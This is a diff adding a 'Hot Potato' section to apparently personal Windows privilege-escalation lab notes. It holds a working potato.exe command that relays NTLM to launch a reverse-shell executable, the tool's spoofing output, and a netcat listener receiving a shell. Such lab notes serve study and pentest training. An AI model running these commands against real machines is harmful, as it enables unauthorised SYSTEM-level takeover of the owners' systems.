@@ -1328,6 +1328,51 @@ oLink.Save
 - This will create a shortcut with target as our reverse shell
 - Now simulate admin log in while a listener is setup on kali on port `9001`.
 
+
+
+## 13. Hot Potato
+
+- Hot potato is the name of an attack that uses a spoffing attack with an NTLM relay attack to gain SYSTEM privileges.
+- The attack tricks windows into authenticating as the SYSTEM user to a fake HTTP seerver using NTLM.
+- The NTLM credentails then get relayed to SMB in order to gain command execution.
+- This attack works on Windows 7,8 early versions of windows10, and their server copunterparts.
+
+- Setup the listener and execute `potato.exe` with following switches
+```bash
+C:\PrivEsc>.\potato.exe -ip 192.168.37.128 -cmd "C:\PrivEsc\reverse_9001.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
+Starting NBNS spoofer...WPAD = 127.0.0.1
+Exhausting UDP source ports so DNS lookups will fail...Listening...
+Couldn't bind to a UDP port 500
+Couldn't bind to a UDP port 4500
+Couldn't bind to a UDP port 5050
+Couldn't bind to a UDP port 5353
+Couldn't bind to a UDP port 5355
+Couldn't bind to a UDP port 49874
+DNS lookup fails - UDP Exhaustion worked!
+UDP Ports exhausted...
+Clearing dns and nbns cache...
+```
+
+- options
+
+|  Argument | Description   |  
+|---|---|
+|  `ip` | target ip   |  
+| `cmd`  | is the command we want to run, (reverse shell in our case)  |  
+
+
+__Result__
+```bash
+└─$ nc -lvnp 9001 
+listening on [any] 9001 ...
+connect to [192.168.37.128] from (UNKNOWN) [192.168.37.134] 50184
+Microsoft Windows [Version 10.0.17763.379]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+
 <br><br/><br><br/><br><br/><br><br/><br><br/><br><br/>
 <br><br/><br><br/><br><br/><br><br/><br><br/><br><br/>
 
